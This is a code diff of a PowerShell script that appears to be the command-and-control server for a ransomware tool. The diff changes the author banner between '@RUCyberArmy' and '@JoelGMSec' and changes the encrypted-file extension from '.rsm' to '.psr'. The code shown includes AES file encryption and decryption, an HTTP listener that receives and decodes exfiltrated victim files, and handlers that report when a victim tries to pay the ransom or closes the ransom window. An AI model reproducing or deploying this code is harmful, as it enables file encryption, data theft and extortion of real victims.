@@ -22,11 +22,13 @@ $http.Start()
 # Banner
 function Show-Banner {
    Write-Host 
-   Write-Host "##################" -ForegroundColor White
-   Write-Host "##################"  -ForegroundColor Blue
-   Write-Host "##################"  -ForegroundColor Red
-   Write-Host                                                            
-   Write-Host "  ----------------- by @RUCyberArmy ----------------  " -ForegroundColor Green }
+   Write-Host "   ____ ____  ____                            " -ForegroundColor Blue
+   Write-Host "  / ___|___ \/ ___|  ___ _ ____   _____ _ __  " -ForegroundColor Blue
+   Write-Host " | |     __) \___ \ / _ \ '__\ \ / / _ \ '__| " -ForegroundColor Blue
+   Write-Host " | |___ / __/ ___) |  __/ |   \ V /  __/ |    " -ForegroundColor Blue
+   Write-Host "  \____|_____|____/ \___|_|    \_/ \___|_|    " -ForegroundColor Blue
+   Write-Host                                                
+   Write-Host "  -------------- by @JoelGMSec -------------  " -ForegroundColor Green }
 
 # Help
 function Show-Help {
@@ -41,8 +43,8 @@ function Show-Help {
 
 # Errors
 if ($args[0] -like "-h*") { Show-Banner ; Show-Help ; break }
-if ($null -eq $args[0]) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
-if ($null -eq $args[1]) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
+if ($args[0] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
+if ($args[1] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
 
 # Functions
 function Invoke-AESEncryption {
@@ -81,7 +83,7 @@ function Invoke-AESEncryption {
                 $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                 if (!$File.FullName) { break }
                 $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
-                $outPath = $File.FullName + ".rsm" }
+                $outPath = $File.FullName + ".psr" }
 
              $encryptor = $aesManaged.CreateEncryptor()
              $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
@@ -100,7 +102,7 @@ function Invoke-AESEncryption {
                 $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                 if (!$File.FullName) { break }
                 $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
-                $outPath = $File.FullName.replace(".rsm","") }
+                $outPath = $File.FullName.replace(".psr","") }
 
              $aesManaged.IV = $cipherBytes[0..15]
              $decryptor = $aesManaged.CreateDecryptor()
@@ -137,10 +139,10 @@ if ($context.Request.HttpMethod -eq "GET") {
       Write-Host ; Write-Host "[i] Recieving exfiltrated files and decrypting.." -f Green ; sleep 2 }   
 
    if ($context.Request.RawUrl -eq "/pay") { Write-Host ; Write-Host "[i] Waiting response for payment.." -f Green ; sleep 2
-      Write-Host "[!] User as tried to pay the rescue!" -f Red }
+      Write-Host "[!] User was tried to pay the rescue!" -f Red }
 
    if ($context.Request.RawUrl -eq "/close") { Write-Host ; Write-Host "[i] Waiting response for payment.." -f Green ; sleep 2
-      Write-Host "[!] User as closed the rescue window!" -f Red }
+      Write-Host "[!] User was closed the rescue window!" -f Red }
 
    if ($context.Request.RawUrl -eq "/done") { Write-Host ; Write-Host "[i] Done!" -f Green ; Write-Host ; $http.Stop() }
    
@@ -174,7 +176,7 @@ if ($context.Request.HttpMethod -eq "POST") {
       if ($B64Name -eq "none.null") { Write-Host "[!] No files have been recieved!" -f Red } else { 
         
       if ($OSVersion -like "*Win*") { $C2Rfile = "$pwd\C2Files\$B64Name" } else { $C2Rfile = "$pwd/C2Files/$B64Name" } 
-         $C2RName = $C2Rfile.replace(".rsm","") ; Write-Host "[+] $C2RName file recieved" -f Blue ; $B64file = R64Decoder -f $FormContent
+         $C2RName = $C2Rfile.replace(".psr","") ; Write-Host "[+] $C2RName file recieved" -f Blue ; $B64file = R64Decoder -f $FormContent
 
       if (-not (Test-Path $C2Rfile)) { if ((Get-Host).Version.Major -gt 5) {
          Add-Content -Path $C2Rfile -Value $B64file -AsByteStream } else { 
